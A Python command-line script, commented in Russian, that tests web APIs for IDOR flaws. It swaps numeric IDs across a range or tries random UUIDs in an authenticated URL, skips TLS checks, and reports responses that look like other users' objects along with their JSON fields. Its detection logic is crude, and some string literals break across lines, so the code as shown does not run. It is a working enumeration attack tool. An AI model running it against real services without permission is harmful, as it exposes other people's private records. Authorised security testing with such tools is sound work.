#!/usr/bin/env python3
import requests
import argparse
import re
import uuid
import json
import sys
import time
from urllib.parse import urlparse, urlunparse
import warnings
warnings.filterwarnings("ignore")
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
HEADERS = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
"Accept": "application/json, text/html, */*",
}
def extract_id_from_url(url: str) -> tuple[str, str, str] | None:
"""
Находит ID в URL. Возвращает (prefix, id_value, suffix).
Пример: /api/user/1337/profile → ('/api/user/', '1337', '/profile')
"""
# Числовой ID
m = re.search(r'(/[^/]*/)(\d{1,10})(/.*|$)', url)
if m:
return (m.group(1), m.group(2), m.group(3))
# UUID
uuid_pattern = r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})'
m = re.search(uuid_pattern, url, re.IGNORECASE)
if m:
idx = m.start()
return (url[:idx], m.group(1), url[m.end():])
return None
def make_request(session: requests.Session, url: str,
timeout: float = 5) -> dict:
"""Выполняет GET запрос и возвращает метаданные ответа."""
try:
resp = session.get(url, timeout=timeout, verify=False,
allow_redirects=True)
return {
"status": resp.status_code,
"length": len(resp.text),
"body": resp.text,
"headers": dict(resp.headers),
}
except Exception:
return {"status": 0, "length": 0, "body": "", "headers": {}}
def is_different_object(baseline: dict, response: dict,
baseline_id: str, test_id: str) -> bool:
"""
Определяет, является ли ответ другим объектом (не ошибкой).
Признаки IDOR: успешный ответ с другими данными.
"""
# Нет смысла анализировать ошибки
if response["status"] in (401, 403, 404, 429, 500):
return False
if response["status"] == 0:
return False
# Тот же ID в ответе — это наш объект, не чужой
if test_id in response["body"] and baseline_id not in response["body"]:
return True
# Ответ успешный, схожей длины с baseline, но содержит другие данные
if (response["status"] == 200 and
abs(response["length"] - baseline["length"]) < baseline["length"] * 0.5 and
response["length"] > 50):
return True
return False
def numeric_idor_test(session: requests.Session, url: str,
id_pos: tuple, start: int, end: int,
current_id: str, delay: float) -> list[dict]:
"""Перебирает числовые ID."""
prefix, _, suffix = id_pos
findings = []
# Сначала получаем baseline (наш объект)
baseline = make_request(session, url)
print(f"{CYAN}[*] Baseline: HTTP {baseline['status']} | "
f"{baseline['length']} байт{RESET}")
# Перебираем
found_count = 0
for test_id in range(start, end + 1):
if str(test_id) == current_id:
continue # Пропускаем свой ID
test_url = f"{prefix.rsplit('/', 2)[0]}{prefix.rsplit('/', 2)[-1]}{test_id}{suffix}"
# Упрощённая замена ID в URL
test_url = url.replace(f"/{current_id}/", f"/{test_id}/")
test_url = url.replace(f"/{current_id}", f"/{test_id}")
resp = make_request(session, test_url)
if is_different_object(baseline, resp, current_id, str(test_id)):
found_count += 1
print(f" {GREEN}[IDOR] ID={test_id} | HTTP {resp['status']} | "
f"{resp['length']} байт{RESET}")
print(f"
 URL: {test_url}")
# Показываем первые поля JSON если возможно
try:
data = json.loads(resp["body"])
if isinstance(data, dict):
keys = list(data.keys())[:5]
print(f"
 Поля: {keys}")
except Exception:
pass
findings.append({"id": test_id, "url": test_url,
"status": resp["status"]})
if found_count >= 5:
print(f"\n{YELLOW}[!] Найдено 5+ объектов — IDOR подтверждён.
Останавливаемся.{RESET}")
break
if delay:
time.sleep(delay)
return findings
def main():
parser = argparse.ArgumentParser(description="IDOR Tester")
parser.add_argument("-u", "--url",
 required=True,
help="URL с ID: http://target.com/api/user/1337")
parser.add_argument("--mode",
 default="numeric",
choices=["numeric", "uuid"],
help="Тип ID для перебора")
parser.add_argument("--range",
 default="1-100",
help="Диапазон для numeric mode: start-end")
parser.add_argument("--cookie",
 default=None,
help="Cookie для авторизации: session=abc123")
parser.add_argument("--token",
 default=None,
help="Bearer token")
parser.add_argument("--delay",
 type=float, default=0.1,
help="Задержка между запросами (сек)")
args = parser.parse_args()
session = requests.Session()
session.headers.update(HEADERS)
# Авторизация
if args.cookie:
for pair in args.cookie.split(";"):
if "=" in pair:
k, v = pair.strip().split("=", 1)
session.cookies.set(k, v)
if args.token:
session.headers["Authorization"] = f"Bearer {args.token}"
# Находим ID в URL
id_pos = extract_id_from_url(args.url)
if not id_pos:
print(f"{RED}[!] ID не найден в URL. Формат: /api/user/1337 или
/api/user/uuid{RESET}")
sys.exit(1)
prefix, current_id, suffix = id_pos
print(f"{CYAN}[*] URL:
 {args.url}{RESET}")
print(f"{CYAN}[*] Найден ID: '{current_id}' в позиции
...{prefix}{current_id}{suffix}{RESET}")
print(f"{CYAN}[*] Режим: {args.mode}{RESET}")
print("-" * 60)
if args.mode == "numeric":
start, end = map(int, args.range.split("-"))
try:
current_int = int(current_id)
except ValueError:
print(f"{RED}[!] ID не является числом. Используй --mode uuid{RESET}")
sys.exit(1)
findings = numeric_idor_test(session, args.url, id_pos,
start, end, current_id, args.delay)
else:
print(f"{YELLOW}[*] UUID mode: генерируем и тестируем случайные
UUID...{RESET}")
findings = []
baseline = make_request(session, args.url)
for _ in range(50):
test_id = str(uuid.uuid4())
test_url = args.url.replace(current_id, test_id)
resp = make_request(session, test_url)
if is_different_object(baseline, resp, current_id, test_id):
print(f" {GREEN}[IDOR] UUID={test_id} | HTTP {resp['status']}{RESET}")
findings.append({"id": test_id, "url": test_url})
print(f"\n{'='*60}")
if findings:
print(f"{GREEN}[✓] IDOR подтверждён! Найдено {len(findings)} доступных
объектов{RESET}")
else:
print(f"{RED}[-] IDOR не обнаружен в тестируемом диапазоне{RESET}")
if __name__ == "__main__":
main()
